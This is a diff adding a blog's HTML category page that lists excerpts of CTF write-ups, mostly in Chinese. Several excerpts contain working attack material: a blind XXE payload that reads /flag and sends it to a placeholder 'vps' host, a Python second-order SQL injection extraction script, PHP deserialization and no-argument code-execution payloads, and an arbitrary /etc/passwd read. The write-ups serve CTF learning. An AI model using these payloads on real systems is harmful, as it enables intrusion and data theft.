@@ -1,0 +1,492 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto">
+
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="noindex, nofollow">
+<title>CTF | ch4ser の 超元域</title>
+<meta name="keywords" content="">
+<meta name="description" content="">
+<meta name="author" content="">
+<link rel="canonical" href="http://localhost:1313/categories/ctf/">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.d690e4a0ad08d48813d0c47209f8dc999c569e14cb01b287b5bfa2d3e05067ef.css" integrity="sha256-1pDkoK0I1IgT0MRyCfjcmZxWnhTLAbKHtb&#43;i0&#43;BQZ&#43;8=" rel="preload stylesheet" as="style">
+<link rel="icon" href="http://localhost:1313/flash.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="http://localhost:1313/flash.ico">
+<link rel="icon" type="image/png" sizes="32x32" href="http://localhost:1313/flash.ico">
+<link rel="apple-touch-icon" href="http://localhost:1313/flash.ico">
+<link rel="mask-icon" href="http://localhost:1313/flash.ico">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<link rel="alternate" type="application/rss+xml" href="http://localhost:1313/categories/ctf/index.xml">
+<link rel="alternate" hreflang="en" href="http://localhost:1313/categories/ctf/">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+    <style>
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --theme: rgb(29, 30, 32);
+                --entry: rgb(46, 46, 51);
+                --primary: rgb(218, 218, 219);
+                --secondary: rgb(155, 156, 157);
+                --tertiary: rgb(65, 66, 68);
+                --content: rgb(196, 196, 197);
+                --code-block-bg: rgb(46, 46, 51);
+                --code-bg: rgb(55, 56, 62);
+                --border: rgb(51, 51, 51);
+            }
+
+            .list {
+                background: var(--theme);
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-track {
+                background: 0 0;
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-thumb {
+                border-color: var(--theme);
+            }
+        }
+
+    </style>
+</noscript>
+</head>
+
+<body class="list" id="top">
+<script>
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.body.classList.add('dark');
+    } else if (localStorage.getItem("pref-theme") === "light") {
+        document.body.classList.remove('dark')
+    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.body.classList.add('dark');
+    }
+
+</script>
+
+<header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="http://localhost:1313/" accesskey="h" title="ch4ser の 超元域 (Alt + H)">
+                <img src="http://localhost:1313/avatar.jpg" alt="" aria-label="logo"
+                    height="35">ch4ser の 超元域</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)" aria-label="Toggle theme">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="http://localhost:1313/categories/" title="categories">
+                    <span>categories</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/about/" title="about">
+                    <span>about</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main"> 
+<header class="page-header"><div class="breadcrumbs"><a href="http://localhost:1313/">Home</a>&nbsp;»&nbsp;<a href="http://localhost:1313/categories/">Categories</a></div>
+  <h1>
+    CTF
+  </h1>
+</header>
+
+<article class="post-entry tag-entry"> 
+<figure class="entry-cover">
+            <img loading="lazy" src="http://localhost:1313/posts/ctf-k8s-lan-party/2024-03-26-21-02-36.png" alt="">
+</figure>
+  <header class="entry-header">
+    <h2 class="entry-hint-parent">k8s lan party
+    </h2>
+  </header>
+  <div class="entry-content">
+    <p>Long time no CTF~~
+RECON Just check the environment related to K8s using env and reconnoiter internal service using dnscan
+This blog is good written link
+Finding Neighbours According to the description, the sidecar container of current pod is sending some information (possibly flag) to remote server. So, the first step is digging the remote server like what we do in the first challenge, which leads me to reporting-service.k8s-lan-party.svc.cluster.local.
+As we all know, all containers within same pod share one network namespace, which means we can sniff the traffic from our current container.
+...</p>
+  </div>
+  <footer class="entry-footer"><span title='2024-03-15 07:34:46 +0000 UTC'>March 15, 2024</span>&nbsp;·&nbsp;4 min&nbsp;·&nbsp;674 words&nbsp;·&nbsp;ch4ser</footer>
+  <a class="entry-link" aria-label="post link to k8s lan party" href="http://localhost:1313/posts/ctf-k8s-lan-party/"></a>
+</article>
+
+<article class="post-entry tag-entry"> 
+  <header class="entry-header">
+    <h2 class="entry-hint-parent">pwnable尝试
+    </h2>
+  </header>
+  <div class="entry-content">
+    <p>尝试学pwn,放弃学pwn
+...</p>
+  </div>
+  <footer class="entry-footer"><span title='2022-01-27 17:48:33 +0000 UTC'>January 27, 2022</span>&nbsp;·&nbsp;2 min&nbsp;·&nbsp;334 words&nbsp;·&nbsp;ch4ser</footer>
+  <a class="entry-link" aria-label="post link to pwnable尝试" href="http://localhost:1313/posts/sec-pwnable/"></a>
+</article>
+
+<article class="post-entry tag-entry"> 
+  <header class="entry-header">
+    <h2 class="entry-hint-parent">GACTF2020
+    </h2>
+  </header>
+  <div class="entry-content">
+    <p>simpleflask 和以往的flask不一样的地方在于, 这里是经过更新后的flask, 计算pin码的方式已经和以前不一样了, 参考 https://www.chainnews.com/articles/898433701852.htm, 不过问题不大,就把machine-id拼接在docker那一串东西的前面就可以了, 需要注意的是每十分钟重启时候的机器mac地址是会变化的.
+...</p>
+  </div>
+  <footer class="entry-footer"><span title='2020-08-29 15:49:36 +0000 UTC'>August 29, 2020</span>&nbsp;·&nbsp;2 min&nbsp;·&nbsp;248 words&nbsp;·&nbsp;ch4ser</footer>
+  <a class="entry-link" aria-label="post link to GACTF2020" href="http://localhost:1313/posts/ctf-gactf2020/"></a>
+</article>
+
+<article class="post-entry tag-entry"> 
+<figure class="entry-cover">
+            <img loading="lazy" src="http://localhost:1313/posts/ctf-qwb2020-web-1/image-20211114141959846.png" alt="">
+</figure>
+  <header class="entry-header">
+    <h2 class="entry-hint-parent">qwb2020web复现
+    </h2>
+  </header>
+  <div class="entry-content">
+    <p>half_infiltration 开局的页面如下
+&lt;?php highlight_file(__FILE__); $flag=file_get_contents(&#39;ssrf.php&#39;); class Pass { function read() { ob_start(); global $result; print $result; } } class User { public $age,$sex,$num; function __destruct() { $student = $this-&gt;age; $boy = $this-&gt;sex; $a = $this-&gt;num; $student-&gt;$boy(); if(!(is_string($a)) ||!(is_string($boy)) || !(is_object($student))) { ob_end_clean(); exit(); } global $$a; $result=$GLOBALS[&#39;flag&#39;]; ob_end_clean(); } } if (isset($_GET[&#39;x&#39;])) { unserialize($_GET[&#39;x&#39;])-&gt;get_it(); } 思路是进行两次反序列化, 第一次将$_GLOBALS[‘flag’]赋值给全局变量$result, 第二次反序列化是让程序在ob_end_clean()执行之前报错退出. ob_start会打开输出缓冲
+启用输出缓冲会导致PHP开始存储你输出的脚本而不是立即将它们发送到客户端。当脚本结束或者你调用了ob_flush()函数，PHP才会将内容发送到客户端。
+ob_end_clean会将输出缓冲的内容进行一个清空, 那么如果要看到$result的内容的话, 我们就需要在ob_end_clean之前退出程序. 通过将$a赋值为this可以做到让程序报错退出.
+&lt;?php class Pass{ function read(){ // ob_start(); global $result; print $result; } } class User{ public $age, $sex, $num; function __construct($a, $b, $c) { $this-&gt;age = $a; $this-&gt;sex = $b; $this-&gt;num = $c; } } echo urlencode(serialize([ new User(new Pass(), &#34;read&#34;, &#34;result&#34;), new User(new Pass(), &#34;read&#34;, &#34;this&#34;) ])); ?&gt; 然后我们可以看到ssrf.php的内容
+...</p>
+  </div>
+  <footer class="entry-footer"><span title='2020-08-27 20:48:12 +0000 UTC'>August 27, 2020</span>&nbsp;·&nbsp;2 min&nbsp;·&nbsp;370 words&nbsp;·&nbsp;ch4ser</footer>
+  <a class="entry-link" aria-label="post link to qwb2020web复现" href="http://localhost:1313/posts/ctf-qwb2020-web-1/"></a>
+</article>
+
+<article class="post-entry tag-entry"> 
+  <header class="entry-header">
+    <h2 class="entry-hint-parent">ciscn2020_online
+    </h2>
+  </header>
+  <div class="entry-content">
+    <p> web越來越没有牌面了…国赛果然是pwn和misc的天下
+...</p>
+  </div>
+  <footer class="entry-footer"><span title='2020-08-20 13:16:50 +0000 UTC'>August 20, 2020</span>&nbsp;·&nbsp;2 min&nbsp;·&nbsp;306 words&nbsp;·&nbsp;ch4ser</footer>
+  <a class="entry-link" aria-label="post link to ciscn2020_online" href="http://localhost:1313/posts/ctf-ciscn2020-online/"></a>
+</article>
+
+<article class="post-entry tag-entry"> 
+<figure class="entry-cover">
+            <img loading="lazy" src="http://localhost:1313/posts/ctf-%E7%BD%91%E9%BC%8E%E6%9D%AF2020/image-20211114142107501.png" alt="">
+</figure>
+  <header class="entry-header">
+    <h2 class="entry-hint-parent">网鼎杯2020 web
+    </h2>
+  </header>
+  <div class="entry-content">
+    <p>filejava 提供了文件上传和下载的功能, 在下载功能那里我们可以任意文件读取, 通过把文件名换成文件夹名字可以在报错中爆出绝对路径, 如图:
+绝对路径
+/usr/local/tomcat/webapps/ROOT/WEB-INF/upload/0/10/ 读文件/etc/passwd
+读日志文件 logs/catalina.out
+​ 发现有一个war包,下载下来进行源码审计, 发现一处突兀的地方
+if (filename.startsWith(&#34;excel-&#34;) &amp;&amp; &#34;xlsx&#34;.equals(fileExtName)) try { Workbook wb1 = WorkbookFactory.create(in); Sheet sheet = wb1.getSheetAt(0); System.out.println(sheet.getFirstRowNum()); } catch (InvalidFormatException e) { System.err.println(&#34;poi-ooxml-3.10 has something wrong&#34;); e.printStackTrace(); } 这里会对exce开头而且后缀名为xlsx的文件进行一个解析, 考虑一下使用xlsx来进行blind xxe, 具体可以参考 https://www.jishuwen.com/d/2inW/zh-hk
+新建一个xlsx文档, 解压, 修改Content_Types.xml的内容为
+&lt;?xml version=&#34;1.0&#34;?&gt; &lt;!DOCTYPE r [ &lt;!ENTITY % data3 SYSTEM &#34;file:///flag&#34;&gt; &lt;!ENTITY % sp SYSTEM &#34;http://vps/ext.dtd&#34;&gt; %sp; %param3; %exfil; ]&gt; 在vps上的web目录下面放置一个ext.dtd, 内容如下:
+&lt;!ENTITY % param3 &#34;&lt;!ENTITY &amp;#37; exfil SYSTEM &#39;ftp://vps/%data3;&#39;&gt;&#34;&gt; vps上开启ftp监听脚本, 脚本如下
+...</p>
+  </div>
+  <footer class="entry-footer"><span title='2020-05-11 16:11:31 +0000 UTC'>May 11, 2020</span>&nbsp;·&nbsp;4 min&nbsp;·&nbsp;796 words&nbsp;·&nbsp;ch4ser</footer>
+  <a class="entry-link" aria-label="post link to 网鼎杯2020 web" href="http://localhost:1313/posts/ctf-%E7%BD%91%E9%BC%8E%E6%9D%AF2020/"></a>
+</article>
+
+<article class="post-entry tag-entry"> 
+  <header class="entry-header">
+    <h2 class="entry-hint-parent">padding_oracle 和 cbc字节反转
+    </h2>
+  </header>
+  <div class="entry-content">
+    <p>padding oracle 原理: https://www.freebuf.com/articles/database/150606.html
+...</p>
+  </div>
+  <footer class="entry-footer"><span title='2020-02-03 16:42:20 +0000 UTC'>February 3, 2020</span>&nbsp;·&nbsp;5 min&nbsp;·&nbsp;1041 words&nbsp;·&nbsp;ch4ser</footer>
+  <a class="entry-link" aria-label="post link to padding_oracle 和 cbc字节反转" href="http://localhost:1313/posts/sec-padding-oracle-and-cbc-attack/"></a>
+</article>
+
+<article class="post-entry tag-entry"> 
+  <header class="entry-header">
+    <h2 class="entry-hint-parent">java_web题目复现记录
+    </h2>
+  </header>
+  <div class="entry-content">
+    <p>开一个新坑~~
+...</p>
+  </div>
+  <footer class="entry-footer"><span title='2020-01-03 10:57:44 +0000 UTC'>January 3, 2020</span>&nbsp;·&nbsp;5 min&nbsp;·&nbsp;950 words&nbsp;·&nbsp;ch4ser</footer>
+  <a class="entry-link" aria-label="post link to java_web题目复现记录" href="http://localhost:1313/posts/sec-java-web/"></a>
+</article>
+
+<article class="post-entry tag-entry"> 
+  <header class="entry-header">
+    <h2 class="entry-hint-parent">LD_PRELOAD劫持类型题目
+    </h2>
+  </header>
+  <div class="entry-content">
+    <p>贴几个参考链接
+https://www.cnblogs.com/wfzWebSecuity/p/11213732.html
+https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD
+...</p>
+  </div>
+  <footer class="entry-footer"><span title='2019-12-26 16:37:19 +0000 UTC'>December 26, 2019</span>&nbsp;·&nbsp;3 min&nbsp;·&nbsp;435 words&nbsp;·&nbsp;ch4ser</footer>
+  <a class="entry-link" aria-label="post link to LD_PRELOAD劫持类型题目" href="http://localhost:1313/posts/sec-ld-preload%E5%8A%AB%E6%8C%81%E7%B1%BB%E5%9E%8B%E9%A2%98%E7%9B%AE/"></a>
+</article>
+
+<article class="post-entry tag-entry"> 
+  <header class="entry-header">
+    <h2 class="entry-hint-parent">copperstudy-record
+    </h2>
+  </header>
+  <div class="entry-content">
+    <p>强网杯 2019 copperstudy 拖拖拉拉终于把这题复现了…
+开局计算哈希, 爆破爆破
+...</p>
+  </div>
+  <footer class="entry-footer"><span title='2019-12-19 20:51:05 +0000 UTC'>December 19, 2019</span>&nbsp;·&nbsp;3 min&nbsp;·&nbsp;598 words&nbsp;·&nbsp;ch4ser</footer>
+  <a class="entry-link" aria-label="post link to copperstudy-record" href="http://localhost:1313/posts/ctf-qwb-copperstudy-record/"></a>
+</article>
+
+<article class="post-entry tag-entry"> 
+<figure class="entry-cover">
+            <img loading="lazy" src="http://localhost:1313/posts/ctf-roarctfwp/image-20211114142019085.png" alt="">
+</figure>
+  <header class="entry-header">
+    <h2 class="entry-hint-parent">RoarCTF 2019复现
+    </h2>
+  </header>
+  <div class="entry-content">
+    <p>web online_proxy 特征: 第一次登录后源代码内容有如下:
+换一个X-Forwarded-For 后会发现currentip是根据xff判别的
+那么有理由认为上一个ip被存储进了数据库中,并在每次检测到访问ip和上一个ip不同的时候就会改变数据库. 源码这里也写到了
+$result = query(&#34;select current_ip, last_ip from ip_log where uuid = &#39;&#34;.addslashes($uuid).&#34;&#39;&#34;); if(count($result) &gt; 0) { if($ip !== $result[0][&#39;current_ip&#39;]) { $last_ip = $result[0][&#39;current_ip&#39;]; query(&#34;delete from ip_log where uuid=&#39;&#34;.addslashes($uuid).&#34;&#39;&#34;); } else { $last_ip = $result[0][&#39;last_ip&#39;]; } } query(&#34;insert into ip_log values (&#39;&#34;.addslashes($uuid).&#34;&#39;, &#39;&#34;.addslashes($ip).&#34;&#39;, &#39;$last_ip&#39;);&#34;); die(&#34;\n&lt;!-- Debug Info: \n Duration: $time s \n Current Ip: $ip &#34;.($last_ip !== &#34;&#34; ? &#34;\nLast Ip: &#34;.$last_ip : &#34;&#34;).&#34; --&gt;&#34;); 解法:
+先用1&#39;|1|&#39;1作为xff访问网站网站 , 访问成功之后改变xff, 再次访问, 这个时候由于前后xff不一致, 原来存储进数据库currentip的ip被重新提取出来存进lastip项中, 如果这个lastip没有过滤的话,就可以造成二次注入, 事实上也确实如此, 但这个可能得猜……在第二次访问之后, payload被重新插入进数据库中, 带着第二次访问的xff来第三次访问这个网站,可以看到
+成功执行了.
+搬运赵师傅的脚本学习学习
+#!/usr/bin/env python3 import requests target = &#34;http://localhost:8302/&#34; def execute_sql(sql): print(&#34;[*]请求语句：&#34; &#43; sql) return_result = &#34;&#34; payload = &#34;0&#39;|length((&#34; &#43; sql &#43; &#34;))|&#39;0&#34; session = requests.session() r = session.get(target, headers={&#39;X-Forwarded-For&#39;: payload}) r = session.get(target, headers={&#39;X-Forwarded-For&#39;: &#39;glzjin&#39;}) r = session.get(target, headers={&#39;X-Forwarded-For&#39;: &#39;glzjin&#39;}) start_pos = r.text.find(&#34;Last Ip: &#34;) end_pos = r.text.find(&#34; --&gt;&#34;, start_pos) length = int(r.text[start_pos &#43; 9: end_pos]) print(&#34;[&#43;]长度：&#34; &#43; str(length)) for i in range(1, length &#43; 1, 5): payload = &#34;0&#39;|conv(hex(substr((&#34; &#43; sql &#43; &#34;),&#34; &#43; str(i) &#43; &#34;,5)),16,10)|&#39;0&#34; r = session.get(target, headers={&#39;X-Forwarded-For&#39;: payload}) r = session.get(target, headers={&#39;X-Forwarded-For&#39;: &#39;glzjin&#39;}) r = session.get(target, headers={&#39;X-Forwarded-For&#39;: &#39;glzjin&#39;}) start_pos = r.text.find(&#34;Last Ip: &#34;) end_pos = r.text.find(&#34; --&gt;&#34;, start_pos) result = int(r.text[start_pos &#43; 9: end_pos]) return_result &#43;= bytes.fromhex(hex(result)[2:]).decode(&#39;utf-8&#39;) print(&#34;[&#43;]位置 &#34; &#43; str(i) &#43; &#34; 请求五位成功:&#34; &#43; bytes.fromhex(hex(result)[2:]).decode(&#39;utf-8&#39;)) return return_result # 获取数据库 print(&#34;[&#43;]获取成功：&#34; &#43; execute_sql(&#34;SELECT group_concat(SCHEMA_NAME) FROM information_schema.SCHEMATA&#34;)) # 获取数据库表 print(&#34;[&#43;]获取成功：&#34; &#43; execute_sql(&#34;SELECT group_concat(TABLE_NAME) FROM information_schema.TABLES WHERE TABLE_SCHEMA = &#39;F4l9_D4t4B45e&#39;&#34;)) # 获取数据库表 print(&#34;[&#43;]获取成功：&#34; &#43; execute_sql(&#34;SELECT group_concat(COLUMN_NAME) FROM information_schema.COLUMNS WHERE TABLE_SCHEMA = &#39;F4l9_D4t4B45e&#39; AND TABLE_NAME = &#39;F4l9_t4b1e&#39; &#34;)) # 获取表中内容 print(&#34;[&#43;]获取成功：&#34; &#43; execute_sql(&#34;SELECT group_concat(F4l9_C01uMn) FROM F4l9_D4t4B45e.F4l9_t4b1e&#34;)) 5555555
+...</p>
+  </div>
+  <footer class="entry-footer"><span title='2019-10-22 08:32:09 +0000 UTC'>October 22, 2019</span>&nbsp;·&nbsp;3 min&nbsp;·&nbsp;611 words&nbsp;·&nbsp;ch4ser</footer>
+  <a class="entry-link" aria-label="post link to RoarCTF 2019复现" href="http://localhost:1313/posts/ctf-roarctfwp/"></a>
+</article>
+
+<article class="post-entry tag-entry"> 
+<figure class="entry-cover">
+            <img loading="lazy" src="http://localhost:1313/posts/ctf-bytectf2019/image-20211114141103041.png" alt="">
+</figure>
+  <header class="entry-header">
+    <h2 class="entry-hint-parent">bytectf2019
+    </h2>
+  </header>
+  <div class="entry-content">
+    <p>boring code source code
+&lt;?php function is_valid_url($url) { if (filter_var($url, FILTER_VALIDATE_URL)) { if (preg_match(&#39;/data:\/\//i&#39;, $url)) { return false; } return true; } return false; } if (isset($_POST[&#39;url&#39;])){ $url = $_POST[&#39;url&#39;]; if (is_valid_url($url)) { $r = parse_url($url); if (preg_match(&#39;/baidu\.com$/&#39;, $r[&#39;host&#39;])) { $code = file_get_contents($url); if (&#39;;&#39; === preg_replace(&#39;/[a-z]&#43;\((?R)?\)/&#39;, NULL, $code)) { if (preg_match(&#39;/et|na|nt|strlen|info|path|rand|dec|bin|hex|oct|pi|exp|log/i&#39;, $code)) { echo &#39;bye~&#39;; } else { eval($code); } } } else { echo &#34;error: host not allowed&#34;; } } else { echo &#34;error: invalid url&#34;; } }else{ highlight_file(__FILE__); } 思路: 注册一个xxxxbaidu.com 形式的域名.绑定到服务器上后放上自己的代码,payload
+if(chdir(next(scandir(chr(ord(strrev(crypt(serialize(array())))))))))readfile(end(scandir(chr(ord(strrev(crypt(serialize(array())))))))); echo(readfile(end(scandir(chr(pos(localtime(time(chdir(next(scandir(current(localeconv())))))))))))); 这两个payload都很精彩, 涉及的知识点如下:
+crypt 函数没有key的时候随机生成key进行加密, 如果多尝试几次加密的话就会发现有几次的加密结果中的末尾有点号.
+ord函数传入字符串的时候, 只返回第一个字符的ascii码
+localeconv函数返回一组包含本地数字和货币格式的数组, 数组第一位是&#34;小数点字符&#34;, 也就是点号
+php &gt; var_dump(localeconv()); array(18) { [&#34;decimal_point&#34;]=&gt; string(1) &#34;.&#34; [&#34;thousands_sep&#34;]=&gt; string(0) &#34;&#34; [&#34;int_curr_symbol&#34;]=&gt; string(0) &#34;&#34; [&#34;currency_symbol&#34;]=&gt; string(0) &#34;&#34; [&#34;mon_decimal_point&#34;]=&gt; string(0) &#34;&#34; [&#34;mon_thousands_sep&#34;]=&gt; string(0) &#34;&#34; [&#34;positive_sign&#34;]=&gt; string(0) &#34;&#34; [&#34;negative_sign&#34;]=&gt; string(0) &#34;&#34; [&#34;int_frac_digits&#34;]=&gt; int(127) [&#34;frac_digits&#34;]=&gt; int(127) [&#34;p_cs_precedes&#34;]=&gt; int(127) [&#34;p_sep_by_space&#34;]=&gt; int(127) [&#34;n_cs_precedes&#34;]=&gt; int(127) [&#34;n_sep_by_space&#34;]=&gt; int(127) [&#34;p_sign_posn&#34;]=&gt; int(127) [&#34;n_sign_posn&#34;]=&gt; int(127) [&#34;grouping&#34;]=&gt; array(0) { } [&#34;mon_grouping&#34;]=&gt; array(0) { } } php &gt; pos() 函数是current函数的别名
+...</p>
+  </div>
+  <footer class="entry-footer"><span title='2019-09-09 08:18:25 +0000 UTC'>September 9, 2019</span>&nbsp;·&nbsp;4 min&nbsp;·&nbsp;787 words&nbsp;·&nbsp;ch4ser</footer>
+  <a class="entry-link" aria-label="post link to bytectf2019" href="http://localhost:1313/posts/ctf-bytectf2019/"></a>
+</article>
+
+<article class="post-entry tag-entry"> 
+  <header class="entry-header">
+    <h2 class="entry-hint-parent">Google_Game
+    </h2>
+  </header>
+  <div class="entry-content">
+    <p>Google Xss game...</p>
+  </div>
+  <footer class="entry-footer"><span title='2019-06-12 19:41:56 +0000 UTC'>June 12, 2019</span>&nbsp;·&nbsp;1 min&nbsp;·&nbsp;161 words&nbsp;·&nbsp;ch4ser</footer>
+  <a class="entry-link" aria-label="post link to Google_Game" href="http://localhost:1313/posts/ctf-google-game/"></a>
+</article>
+
+<article class="post-entry tag-entry"> 
+<figure class="entry-cover">
+            <img loading="lazy" src="http://localhost:1313/posts/ctf-2019-ddctf-web/image-20211114142123083.png" alt="">
+</figure>
+  <header class="entry-header">
+    <h2 class="entry-hint-parent">2019 DDCTF web
+    </h2>
+  </header>
+  <div class="entry-content">
+    <p>考试周结束，有时间来复现了。。。然鹅好像有题目崩了，java又没学过。。。只能复现一部分了。
+web 签到题 点击，扫描，发现除了index.php 之外其他都需要登陆，抓包发现有发送Auth.php请求，其中有didictf_username字段，尝试添加成为didictf_username: admin。成功登陆。
+然后在返回包中显示出了一个php文件，尝试访问看到了Session.php的源代码如下：
+&lt;?php Class Application { var $path = &#39;&#39;; public function response($data, $errMsg = &#39;success&#39;) { $ret = [&#39;errMsg&#39; =&gt; $errMsg, &#39;data&#39; =&gt; $data]; $ret = json_encode($ret); header(&#39;Content-type: application/json&#39;); echo $ret; } public function auth() { $DIDICTF_ADMIN = &#39;admin&#39;; if(!empty($_SERVER[&#39;HTTP_DIDICTF_USERNAME&#39;]) &amp;&amp; $_SERVER[&#39;HTTP_DIDICTF_USERNAME&#39;] == $DIDICTF_ADMIN) { $this-&gt;response(&#39;您当前当前权限为管理员----请访问:app/fL2XID2i0Cdh.php&#39;); return TRUE; }else{ $this-&gt;response(&#39;抱歉，您没有登陆权限，请获取权限后访问-----&#39;,&#39;error&#39;); exit(); } } private function sanitizepath($path) { $path = trim($path);//去掉空格 $path=str_replace(&#39;../&#39;,&#39;&#39;,$path);//过滤第一 $path=str_replace(&#39;..\\&#39;,&#39;&#39;,$path);//过滤第二 return $path; }// public function __destruct() { if(empty($this-&gt;path)) { exit(); }else{ $path = $this-&gt;sanitizepath($this-&gt;path);// ....//config/flag.php if(strlen($path) !== 18) {//../config/flag.php exit(); } $this-&gt;response($data=file_get_contents($path),&#39;Congratulations&#39;); } exit(); } } ?&gt; &lt;?php include &#39;Application.php&#39;; class Session extends Application { //key建议为8位字符串 var $eancrykey = &#39;&#39;; var $cookie_expiration	= 7200; var $cookie_name = &#39;ddctf_id&#39;; var $cookie_path	= &#39;&#39;; var $cookie_domain	= &#39;&#39;; var $cookie_secure	= FALSE; var $activity = &#34;DiDiCTF&#34;; public function index() { if(parent::auth()) { $this-&gt;get_key(); if($this-&gt;session_read()) { $data = &#39;DiDI Welcome you %s&#39;; $data = sprintf($data,$_SERVER[&#39;HTTP_USER_AGENT&#39;]); parent::response($data,&#39;sucess&#39;); }else{ $this-&gt;session_create(); $data = &#39;DiDI Welcome you&#39;; parent::response($data,&#39;sucess&#39;); } } } private function get_key() { //eancrykey and flag under the folder $this-&gt;eancrykey = file_get_contents(&#39;../config/key.txt&#39;); } public function session_read() {//target1: 绕过所有false if(empty($_COOKIE)) { return FALSE; }//cookie not empty $session = $_COOKIE[$this-&gt;cookie_name]; if(!isset($session)) { parent::response(&#34;session not found&#34;,&#39;error&#39;); return FALSE; }//ddctf_id 不能为空 $hash = substr($session,strlen($session)-32);//长度要大于32? 32位之后的内容 $session = substr($session,0,strlen($session)-32);//一直截断到倒数第32位 if($hash !== md5($this-&gt;eancrykey.$session)) {//key.txt 内容和 ddctf_id 内容片段拼接 再md5 等于ddctf_id32位之后的内容 parent::response(&#34;the cookie data not match&#34;,&#39;error&#39;); return FALSE; } $session = unserialize($session);//ddctf_id 反序列化 if(!is_array($session) OR !isset($session[&#39;session_id&#39;]) OR !isset($session[&#39;ip_address&#39;]) OR !isset($session[&#39;user_agent&#39;])){ return FALSE; }//ddctf_id 反序列化之后的内容要有 session_id ip_address user_agent 再来个path?? if(!empty($_POST[&#34;nickname&#34;])) { $arr = array($_POST[&#34;nickname&#34;],$this-&gt;eancrykey); $data = &#34;Welcome my friend %s&#34;; foreach ($arr as $k =&gt; $v) { $data = sprintf($data,$v); } parent::response($data,&#34;Welcome&#34;); }//sprint格式化打印函数利用，通过传递进参数nickname = %S 让它可以读取key。 if($session[&#39;ip_address&#39;] != $_SERVER[&#39;REMOTE_ADDR&#39;]) { parent::response(&#39;the ip addree not match&#39;.&#39;error&#39;); return FALSE; }//ip_address 要写自己的ip if($session[&#39;user_agent&#39;] != $_SERVER[&#39;HTTP_USER_AGENT&#39;]) { parent::response(&#39;the user agent not match&#39;,&#39;error&#39;); return FALSE; }//user_agent 内容要和 http_user_agent的匹配 return TRUE; }//看起来可以动手脚的只有session_id? private function session_create() { $sessionid = &#39;&#39;; while(strlen($sessionid) &lt; 32) { $sessionid .= mt_rand(0,mt_getrandmax()); } $userdata = array( &#39;session_id&#39; =&gt; md5(uniqid($sessionid,TRUE)), &#39;ip_address&#39; =&gt; $_SERVER[&#39;REMOTE_ADDR&#39;], &#39;user_agent&#39; =&gt; $_SERVER[&#39;HTTP_USER_AGENT&#39;], &#39;user_data&#39; =&gt; &#39;&#39;, ); $cookiedata = serialize($ ); $cookiedata = $cookiedata.md5($this-&gt;eancrykey.$cookiedata); $expire = $this-&gt;cookie_expiration &#43; time(); setcookie( $this-&gt;cookie_name, $cookiedata, $expire, $this-&gt;cookie_path, $this-&gt;cookie_domain, $this-&gt;cookie_secure ); } } $ddctf = new Session(); $ddctf-&gt;index(); ?&gt; 得到key之后构造ddctfid:
+...</p>
+  </div>
+  <footer class="entry-footer"><span title='2019-05-11 13:58:05 +0000 UTC'>May 11, 2019</span>&nbsp;·&nbsp;7 min&nbsp;·&nbsp;1385 words&nbsp;·&nbsp;ch4ser</footer>
+  <a class="entry-link" aria-label="post link to 2019 DDCTF web" href="http://localhost:1313/posts/ctf-2019-ddctf-web/"></a>
+</article>
+
+<article class="post-entry tag-entry"> 
+  <header class="entry-header">
+    <h2 class="entry-hint-parent">流量分析
+    </h2>
+  </header>
+  <div class="entry-content">
+    <p> bugku 中的部分misc题目
+...</p>
+  </div>
+  <footer class="entry-footer"><span title='2019-04-22 04:16:47 +0000 UTC'>April 22, 2019</span>&nbsp;·&nbsp;2 min&nbsp;·&nbsp;278 words&nbsp;·&nbsp;ch4ser</footer>
+  <a class="entry-link" aria-label="post link to 流量分析" href="http://localhost:1313/posts/sec-%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/"></a>
+</article>
+
+<article class="post-entry tag-entry"> 
+  <header class="entry-header">
+    <h2 class="entry-hint-parent">密码学题目
+    </h2>
+  </header>
+  <div class="entry-content">
+    <p> 记录密码学刷过的题目
+...</p>
+  </div>
+  <footer class="entry-footer"><span title='2019-04-22 04:14:20 +0000 UTC'>April 22, 2019</span>&nbsp;·&nbsp;5 min&nbsp;·&nbsp;1043 words&nbsp;·&nbsp;ch4ser</footer>
+  <a class="entry-link" aria-label="post link to 密码学题目" href="http://localhost:1313/posts/ctf-crypto/"></a>
+</article>
+
